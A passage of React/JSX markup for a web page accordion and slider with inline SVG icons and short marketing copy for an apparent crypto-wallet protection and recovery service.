                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <rect
                                                x="0.5"
                                                y="0.5"
                                                width={55}
                                                height={55}
                                                rx="27.5"
                                                stroke="#3939EF"
                                                strokeDasharray="3 3"
                                              />
                                              <g clipPath="url(#clip0_2676_142155)">
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2676_142155">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We’ll work with you to choose the
                                          protection that fits your organisation
                                          – and your customers. We’ll stay by
                                          your side to help that protection flex
                                          as your needs evolve.
                                        </div>
                                      </div>
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 13C15 14.1046 14.1046 15 13 15C11.8954 15 11 14.1046 11 13C11 11.8954 11.8954 11 13 11C14.1046 11 15 11.8954 15 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 35C15 36.1046 14.1046 37 13 37C11.8954 37 11 36.1046 11 35C11 33.8954 11.8954 33 13 33C14.1046 33 15 33.8954 15 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 57C15 58.1046 14.1046 59 13 59C11.8954 59 11 58.1046 11 57C11 55.8954 11.8954 55 13 55C14.1046 55 15 55.8954 15 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 35C4 36.1046 3.10457 37 2 37C0.895432 37 0 36.1046 0 35C0 33.8954 0.895432 33 2 33C3.10457 33 4 33.8954 4 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 24C26 25.1046 25.1046 26 24 26C22.8954 26 22 25.1046 22 24C22 22.8954 22.8954 22 24 22C25.1046 22 26 22.8954 26 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 35C26 36.1046 25.1046 37 24 37C22.8954 37 22 36.1046 22 35C22 33.8954 22.8954 33 24 33C25.1046 33 26 33.8954 26 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 46C26 47.1046 25.1046 48 24 48C22.8954 48 22 47.1046 22 46C22 44.8954 22.8954 44 24 44C25.1046 44 26 44.8954 26 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 2C37 3.10457 36.1046 4 35 4C33.8954 4 33 3.10457 33 2C33 0.895431 33.8954 0 35 0C36.1046 0 37 0.895431 37 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 13C37 14.1046 36.1046 15 35 15C33.8954 15 33 14.1046 33 13C33 11.8954 33.8954 11 35 11C36.1046 11 37 11.8954 37 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 24C37 25.1046 36.1046 26 35 26C33.8954 26 33 25.1046 33 24C33 22.8954 33.8954 22 35 22C36.1046 22 37 22.8954 37 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 46C37 47.1046 36.1046 48 35 48C33.8954 48 33 47.1046 33 46C33 44.8954 33.8954 44 35 44C36.1046 44 37 44.8954 37 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 57C37 58.1046 36.1046 59 35 59C33.8954 59 33 58.1046 33 57C33 55.8954 33.8954 55 35 55C36.1046 55 37 55.8954 37 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 68C37 69.1046 36.1046 70 35 70C33.8954 70 33 69.1046 33 68C33 66.8954 33.8954 66 35 66C36.1046 66 37 66.8954 37 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 24C48 25.1046 47.1046 26 46 26C44.8954 26 44 25.1046 44 24C44 22.8954 44.8954 22 46 22C47.1046 22 48 22.8954 48 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 35C48 36.1046 47.1046 37 46 37C44.8954 37 44 36.1046 44 35C44 33.8954 44.8954 33 46 33C47.1046 33 48 33.8954 48 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 46C48 47.1046 47.1046 48 46 48C44.8954 48 44 47.1046 44 46C44 44.8954 44.8954 44 46 44C47.1046 44 48 44.8954 48 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 13C59 14.1046 58.1046 15 57 15C55.8954 15 55 14.1046 55 13C55 11.8954 55.8954 11 57 11C58.1046 11 59 11.8954 59 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 35C59 36.1046 58.1046 37 57 37C55.8954 37 55 36.1046 55 35C55 33.8954 55.8954 33 57 33C58.1046 33 59 33.8954 59 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 57C59 58.1046 58.1046 59 57 59C55.8954 59 55 58.1046 55 57C55 55.8954 55.8954 55 57 55C58.1046 55 59 55.8954 59 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 35C70 36.1046 69.1046 37 68 37C66.8954 37 66 36.1046 66 35C66 33.8954 66.8954 33 68 33C69.1046 33 70 33.8954 70 35Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We keep cool heads in a crisis
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2957_81097)">
                                                <path
                                                  d="M27.0156 36.5172C27.0156 35.98 27.448 35.5345 27.9984 35.5345C28.5356 35.5345 28.9811 35.98 28.9811 36.5172C28.9811 37.0676 28.5356 37.5 27.9984 37.5C27.448 37.5 27.0156 37.0676 27.0156 36.5172ZM27.0156 32.2586C27.0156 31.7214 27.448 31.2759 27.9984 31.2759C28.5356 31.2759 28.9811 31.7214 28.9811 32.2586C28.9811 32.7959 28.5356 33.2414 27.9984 33.2414C27.448 33.2414 27.0156 32.7959 27.0156 32.2586ZM27.0156 28C27.0156 27.4628 27.448 27.0172 27.9984 27.0172C28.5356 27.0172 28.9811 27.4628 28.9811 28C28.9811 28.5372 28.5356 28.9828 27.9984 28.9828C27.448 28.9828 27.0156 28.5372 27.0156 28ZM27.0156 23.7414C27.0156 23.2041 27.448 22.7586 27.9984 22.7586C28.5356 22.7586 28.9811 23.2041 28.9811 23.7414C28.9811 24.2786 28.5356 24.7241 27.9984 24.7241C27.448 24.7241 27.0156 24.2786 27.0156 23.7414ZM27.0156 19.4828C27.0156 18.9455 27.448 18.5 27.9984 18.5C28.5356 18.5 28.9811 18.9455 28.9811 19.4828C28.9811 20.02 28.5356 20.4655 27.9984 20.4655C27.448 20.4655 27.0156 20.02 27.0156 19.4828Z"
                                                  fill="#6E737C"
                                                />
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#6E737C"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2957_81097">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                          <span className="negative icon-minus">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <rect
                                                x="0.5"
                                                y="0.5"
                                                width={55}
                                                height={55}
                                                rx="27.5"
                                                stroke="#3939EF"
                                                strokeDasharray="3 3"
                                              />
                                              <g clipPath="url(#clip0_2676_142155)">
                                                <path
                                                  d="M35.5345 27.9984C35.5345 27.4611 35.9669 27.0156 36.5172 27.0156C37.0545 27.0156 37.5 27.4611 37.5 27.9984C37.5 28.5356 37.0545 28.9811 36.5172 28.9811C35.9669 28.9811 35.5345 28.5356 35.5345 27.9984ZM31.2759 27.9984C31.2759 27.4611 31.7083 27.0156 32.2586 27.0156C32.7959 27.0156 33.2414 27.4611 33.2414 27.9984C33.2414 28.5356 32.7959 28.9811 32.2586 28.9811C31.7083 28.9811 31.2759 28.5356 31.2759 27.9984ZM27.0172 27.9984C27.0172 27.4611 27.4497 27.0156 28 27.0156C28.5372 27.0156 28.9828 27.4611 28.9828 27.9984C28.9828 28.5356 28.5372 28.9811 28 28.9811C27.4497 28.9811 27.0172 28.5356 27.0172 27.9984ZM22.7586 27.9984C22.7586 27.4611 23.2041 27.0156 23.7414 27.0156C24.2786 27.0156 24.7241 27.4611 24.7241 27.9984C24.7241 28.5356 24.2786 28.9811 23.7414 28.9811C23.2041 28.9811 22.7586 28.5356 22.7586 27.9984ZM18.5 27.9984C18.5 27.4611 18.9324 27.0156 19.4828 27.0156C20.02 27.0156 20.4655 27.4611 20.4655 27.9984C20.4655 28.5356 20.02 28.9811 19.4828 28.9811C18.9324 28.9811 18.5 28.5356 18.5 27.9984Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_2676_142155">
                                                  <rect
                                                    width={19}
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(18.5 18.5)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </span>
                                        </div>
                                        <div className="accordion-body1">
                                          We take the weight off your mind.
                                          We’re here 24/7 to restore your wallet
                                          access, and put you back in control.
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div className="custom_arrow arrowsFor_small">
                                    <div className="prev_arrow">
                                      <svg
                                        width={20}
                                        height={20}
                                        viewBox="0 0 20 20"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <g clipPath="url(#clip0_1981_63494)">
                                          <path
                                            d="M9.99304 0.273922C10.1372 0.273922 10.2669 0.302755 10.4111 0.360418C10.5408 0.418081 10.6562 0.49016 10.7571 0.59107C10.9589 0.792891 11.0742 1.06679 11.0742 1.35511C11.0742 1.49926 11.0454 1.64342 10.9877 1.77316C10.9301 1.90291 10.858 2.01823 10.7571 2.11914C10.3534 2.52279 9.63264 2.52279 9.229 2.11914C9.02718 1.91732 8.91185 1.64342 8.91185 1.35511C8.91185 1.06679 9.02718 0.792891 9.229 0.59107C9.43082 0.389249 9.70472 0.273922 9.99304 0.273922Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M7.95989 3.40199C8.37795 3.82005 8.37795 4.49759 7.95989 4.93007C7.52742 5.34812 6.84988 5.34812 6.43182 4.93007C5.99935 4.51201 5.99935 3.82005 6.43182 3.40199C6.64806 3.18576 6.92196 3.08485 7.19586 3.08485C7.48417 3.08485 7.75807 3.18576 7.97431 3.40199H7.95989ZM5.14882 6.19866C5.56687 6.63113 5.56687 7.30867 5.14882 7.74114C4.73076 8.1592 4.0388 8.1592 3.62074 7.74114C3.20269 7.30867 3.20269 6.63113 3.62074 6.19866C3.83698 5.99684 4.11088 5.89592 4.38478 5.89592C4.65868 5.89592 4.93258 5.99684 5.14882 6.19866Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M1.58679 8.68799C1.86068 8.68799 2.149 8.80331 2.35082 9.00513C2.55264 9.20695 2.66797 9.49527 2.66797 9.76917C2.66797 9.91333 2.63914 10.0575 2.58147 10.1872C2.52381 10.317 2.45173 10.4323 2.35082 10.5332C1.94718 10.9368 1.22639 10.9368 0.822749 10.5332C0.620928 10.3314 0.505601 10.0575 0.505601 9.76917C0.505601 9.48085 0.620928 9.20695 0.822749 9.00513C1.02457 8.80331 1.29847 8.68799 1.58679 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M5.14761 11.8161C5.56567 12.2341 5.56567 12.9261 5.14761 13.3441C4.71513 13.7622 4.03759 13.7622 3.61953 13.3441C3.18706 12.9261 3.20148 12.2341 3.61953 11.8161C3.83577 11.5998 4.10967 11.4989 4.38357 11.4989C4.65747 11.4989 4.93137 11.5998 5.14761 11.8161ZM7.94427 14.6271C8.36233 15.0452 8.36233 15.7227 7.94427 16.1552C7.52621 16.5733 6.83425 16.5733 6.4162 16.1552C5.99814 15.7227 5.99814 15.0452 6.4162 14.6271C6.63243 14.4109 6.90633 14.31 7.18023 14.31C7.45413 14.31 7.72803 14.4109 7.94427 14.6271Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M9.97741 17.1083C10.1216 17.1083 10.2657 17.1371 10.3955 17.1948C10.5252 17.2524 10.6405 17.3389 10.7414 17.4254C10.9433 17.6272 11.0586 17.9156 11.0586 18.2039C11.0586 18.4922 10.9433 18.7661 10.7414 18.9679C10.6405 19.0544 10.5252 19.1409 10.3955 19.1986C9.99183 19.3571 9.5161 19.2562 9.21337 18.9679C9.01155 18.7661 8.89623 18.4778 8.89623 18.2039C8.89623 17.9156 9.01155 17.6272 9.21337 17.4254C9.41519 17.2236 9.68909 17.1083 9.97741 17.1083Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M18.411 8.68799C18.6849 8.68799 18.9732 8.80331 19.175 9.00513C19.3769 9.20695 19.4922 9.49527 19.4922 9.76917C19.4922 10.0575 19.3769 10.3458 19.175 10.5332C18.7714 10.9368 18.0362 10.9368 17.647 10.5332C17.4451 10.3458 17.3298 10.0575 17.3298 9.76917C17.3298 9.48085 17.4451 9.20695 17.647 9.00513C17.8488 8.80331 18.1227 8.68799 18.411 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M12.0241 9.77038C12.0241 10.3758 11.534 10.8516 10.9429 10.8516C10.3519 10.8516 9.86176 10.3758 9.86176 9.77038C9.86176 9.17933 10.3519 8.6892 10.9429 8.6892C11.534 8.6892 12.0241 9.17933 12.0241 9.77038ZM15.7578 9.77038C15.7578 10.3758 15.2677 10.8516 14.6766 10.8516C14.0712 10.8516 13.5954 10.3758 13.5954 9.77038C13.5954 9.17933 14.0712 8.6892 14.6766 8.6892C15.2677 8.6892 15.7578 9.17933 15.7578 9.77038Z"
                                            fill="#A6ADBA"
                                          />
                                          <path
                                            d="M7.21178 8.68799C7.5001 8.68799 7.774 8.80331 7.97582 9.00513C8.17764 9.20695 8.29297 9.49527 8.29297 9.76917C8.29297 10.0575 8.17764 10.3458 7.97582 10.5332C7.57218 10.9368 6.85139 10.9368 6.44775 10.5332C6.24593 10.3458 6.1306 10.0575 6.1306 9.76917C6.1306 9.48085 6.24593 9.20695 6.44775 9.00513C6.64957 8.80331 6.92347 8.68799 7.21178 8.68799Z"
                                            fill="#A6ADBA"
                                          />
                                        </g>
                                        <defs>
                                          <clipPath id="clip0_1981_63494">
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="matrix(-1 0 0 -1 19.4922 19.2734)"
                                            />
                                          </clipPath>
                                        </defs>
                                      </svg>
                                    </div>
                                    <div className="slide-count secondary-text-size-small">
                                      <span className="current_slide_t">1</span>
                                      /<span className="total_slide_t">4</span>
                                    </div>
                                    <div className="next_arrow">
                                      <svg
                                        width={20}
                                        height={20}
                                        viewBox="0 0 20 20"
                                        fill="none"
                                        xmlns="http://www.w3.org/2000/svg"
                                      >
                                        <g clipPath="url(#clip0_1981_65839)">
                                          <path
                                            d="M10.007 19.273C9.86281 19.273 9.73307 19.2441 9.58891 19.1865C9.45917 19.1288 9.34384 19.0567 9.24293 18.9558C9.04111 18.754 8.92578 18.4801 8.92578 18.1918C8.92578 18.0476 8.95461 17.9035 9.01228 17.7737C9.06994 17.644 9.14202 17.5286 9.24293 17.4277C9.64657 17.0241 10.3674 17.0241 10.771 17.4277C10.9728 17.6296 11.0881 17.9035 11.0881 18.1918C11.0881 18.4801 10.9728 18.754 10.771 18.9558C10.5692 19.1576 10.2953 19.273 10.007 19.273Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M12.0401 16.1449C11.622 15.7268 11.622 15.0493 12.0401 14.6168C12.4726 14.1988 13.1501 14.1988 13.5682 14.6168C14.0007 15.0349 14.0007 15.7268 13.5682 16.1449C13.3519 16.3611 13.078 16.462 12.8041 16.462C12.5158 16.462 12.2419 16.3611 12.0257 16.1449H12.0401ZM14.8512 13.3482C14.4331 12.9157 14.4331 12.2382 14.8512 11.8057C15.2692 11.3877 15.9612 11.3877 16.3793 11.8057C16.7973 12.2382 16.7973 12.9157 16.3793 13.3482C16.163 13.55 15.8891 13.651 15.6152 13.651C15.3413 13.651 15.0674 13.55 14.8512 13.3482Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M18.4132 10.8589C18.1393 10.8589 17.851 10.7436 17.6492 10.5417C17.4474 10.3399 17.332 10.0516 17.332 9.77771C17.332 9.63355 17.3609 9.48939 17.4185 9.35965C17.4762 9.22991 17.5483 9.11458 17.6492 9.01367C18.0528 8.61003 18.7736 8.61003 19.1773 9.01367C19.3791 9.21549 19.4944 9.48939 19.4944 9.77771C19.4944 10.066 19.3791 10.3399 19.1773 10.5417C18.9754 10.7436 18.7015 10.8589 18.4132 10.8589Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M14.8524 7.73082C14.4343 7.31276 14.4343 6.6208 14.8524 6.20275C15.2849 5.78469 15.9624 5.78469 16.3805 6.20275C16.8129 6.6208 16.7985 7.31276 16.3805 7.73082C16.1642 7.94705 15.8903 8.04796 15.6164 8.04796C15.3425 8.04796 15.0686 7.94705 14.8524 7.73082ZM12.0557 4.91974C11.6377 4.50168 11.6377 3.82414 12.0557 3.39167C12.4738 2.97361 13.1657 2.97361 13.5838 3.39167C14.0019 3.82414 14.0019 4.50168 13.5838 4.91974C13.3676 5.13598 13.0937 5.23689 12.8198 5.23689C12.5459 5.23689 12.272 5.13598 12.0557 4.91974Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M10.0226 2.4386C9.87843 2.4386 9.73427 2.40977 9.60453 2.35211C9.47479 2.29445 9.35946 2.20795 9.25855 2.12146C9.05673 1.91964 8.94141 1.63132 8.94141 1.34301C8.94141 1.05469 9.05673 0.78079 9.25855 0.578969C9.35946 0.492474 9.47479 0.40598 9.60453 0.348317C10.0082 0.189743 10.4839 0.290653 10.7866 0.578969C10.9884 0.78079 11.1038 1.06911 11.1038 1.34301C11.1038 1.63132 10.9884 1.91964 10.7866 2.12146C10.5848 2.32328 10.3109 2.4386 10.0226 2.4386Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M1.589 10.8589C1.3151 10.8589 1.02678 10.7436 0.82496 10.5417C0.623139 10.3399 0.507813 10.0516 0.507813 9.77771C0.507812 9.48939 0.623139 9.20107 0.82496 9.01367C1.2286 8.61003 1.96381 8.61003 2.35303 9.01367C2.55485 9.20107 2.67018 9.48939 2.67018 9.77771C2.67018 10.066 2.55485 10.3399 2.35303 10.5417C2.15121 10.7436 1.87731 10.8589 1.589 10.8589Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M7.97588 9.7765C7.97588 9.17103 8.46601 8.69531 9.05706 8.69531C9.64811 8.69531 10.1382 9.17103 10.1382 9.7765C10.1382 10.3675 9.64811 10.8577 9.05706 10.8577C8.46601 10.8577 7.97588 10.3675 7.97588 9.7765ZM4.24219 9.7765C4.24219 9.17103 4.73232 8.69531 5.32337 8.69531C5.92883 8.69531 6.40456 9.17103 6.40456 9.7765C6.40456 10.3675 5.92883 10.8577 5.32337 10.8577C4.73232 10.8577 4.24219 10.3675 4.24219 9.7765Z"
                                            fill="#3939EF"
                                          />
                                          <path
                                            d="M12.7882 10.8589C12.4999 10.8589 12.226 10.7436 12.0242 10.5417C11.8224 10.3399 11.707 10.0516 11.707 9.77771C11.707 9.48939 11.8224 9.20107 12.0242 9.01367C12.4278 8.61003 13.1486 8.61003 13.5523 9.01367C13.7541 9.20107 13.8694 9.48939 13.8694 9.77771C13.8694 10.066 13.7541 10.3399 13.5523 10.5417C13.3504 10.7436 13.0765 10.8589 12.7882 10.8589Z"
                                            fill="#3939EF"
                                          />
                                        </g>
                                        <defs>
                                          <clipPath id="clip0_1981_65839">
                                            <rect
                                              width="18.9856"
                                              height={19}
                                              fill="white"
                                              transform="translate(0.507812 0.273438)"
                                            />
                                          </clipPath>
                                        </defs>
                                      </svg>
                                    </div>
                                  </div>
                                  <div className="accordion-container mobile_">
                                    <div className="accordion-column1">
                                      <div className="accordion-item1">
                                        <div className="icon">
                                          <svg
                                            width={70}
                                            height={70}
                                            viewBox="0 0 70 70"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <path
                                              d="M15 35C15 36.1046 14.1046 37 13 37C11.8954 37 11 36.1046 11 35C11 33.8954 11.8954 33 13 33C14.1046 33 15 33.8954 15 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M15 68C15 69.1046 14.1046 70 13 70C11.8954 70 11 69.1046 11 68C11 66.8954 11.8954 66 13 66C14.1046 66 15 66.8954 15 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 46C4 47.1046 3.10457 48 2 48C0.895432 48 0 47.1046 0 46C0 44.8954 0.895432 44 2 44C3.10457 44 4 44.8954 4 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M4 57C4 58.1046 3.10457 59 2 59C0.895432 59 0 58.1046 0 57C0 55.8954 0.895432 55 2 55C3.10457 55 4 55.8954 4 57Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 13C26 14.1046 25.1046 15 24 15C22.8954 15 22 14.1046 22 13C22 11.8954 22.8954 11 24 11C25.1046 11 26 11.8954 26 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 13C48 14.1046 47.1046 15 46 15C44.8954 15 44 14.1046 44 13C44 11.8954 44.8954 11 46 11C47.1046 11 48 11.8954 48 13Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 24C26 25.1046 25.1046 26 24 26C22.8954 26 22 25.1046 22 24C22 22.8954 22.8954 22 24 22C25.1046 22 26 22.8954 26 24Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 35C26 36.1046 25.1046 37 24 37C22.8954 37 22 36.1046 22 35C22 33.8954 22.8954 33 24 33C25.1046 33 26 33.8954 26 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M26 68C26 69.1046 25.1046 70 24 70C22.8954 70 22 69.1046 22 68C22 66.8954 22.8954 66 24 66C25.1046 66 26 66.8954 26 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 2C37 3.10457 36.1046 4 35 4C33.8954 4 33 3.10457 33 2C33 0.895431 33.8954 0 35 0C36.1046 0 37 0.895431 37 2Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 35C37 36.1046 36.1046 37 35 37C33.8954 37 33 36.1046 33 35C33 33.8954 33.8954 33 35 33C36.1046 33 37 33.8954 37 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M37 68C37 69.1046 36.1046 70 35 70C33.8954 70 33 69.1046 33 68C33 66.8954 33.8954 66 35 66C36.1046 66 37 66.8954 37 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 35C48 36.1046 47.1046 37 46 37C44.8954 37 44 36.1046 44 35C44 33.8954 44.8954 33 46 33C47.1046 33 48 33.8954 48 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M48 68C48 69.1046 47.1046 70 46 70C44.8954 70 44 69.1046 44 68C44 66.8954 44.8954 66 46 66C47.1046 66 48 66.8954 48 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 35C59 36.1046 58.1046 37 57 37C55.8954 37 55 36.1046 55 35C55 33.8954 55.8954 33 57 33C58.1046 33 59 33.8954 59 35Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M59 68C59 69.1046 58.1046 70 57 70C55.8954 70 55 69.1046 55 68C55 66.8954 55.8954 66 57 66C58.1046 66 59 66.8954 59 68Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 46C70 47.1046 69.1046 48 68 48C66.8954 48 66 47.1046 66 46C66 44.8954 66.8954 44 68 44C69.1046 44 70 44.8954 70 46Z"
                                              fill="#6E737C"
                                            />
                                            <path
                                              d="M70 57C70 58.1046 69.1046 59 68 59C66.8954 59 66 58.1046 66 57C66 55.8954 66.8954 55 68 55C69.1046 55 70 55.8954 70 57Z"
                                              fill="#6E737C"
                                            />
                                          </svg>
                                        </div>
                                        <div className="accordion-header1">
                                          <h5>
                                            We protect against on-chain fraud
                                          </h5>
                                          <span className="positive icon-plus">
                                            <svg
                                              width={20}
                                              height={20}
                                              viewBox="0 0 20 20"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_2048_38666)">
                                                <path
                                                  d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                  fill="#6E737C"
                                                />
                                                <path
